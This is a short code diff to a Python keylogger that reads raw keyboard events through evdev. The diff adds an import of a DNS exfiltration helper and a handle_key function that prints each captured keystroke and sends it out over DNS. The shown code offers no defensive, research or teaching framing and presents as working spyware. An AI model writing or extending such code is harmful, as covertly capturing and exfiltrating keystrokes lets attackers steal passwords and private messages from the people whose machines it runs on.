@@ -1,8 +1,13 @@
 from evdev import InputDevice, categorize, ecodes
+from dns_exfil import send_dns_exfil
 
 KEYBOARD_EVENT = "/dev/input/event6"
 
 keyboard = InputDevice(KEYBOARD_EVENT)
+
+def handle_key(char):
+    print(char, end="", flush=True)
+    send_dns_exfil(char)
 
 print(f"[+] Listening for keystrokes on {KEYBOARD_EVENT}...")
 
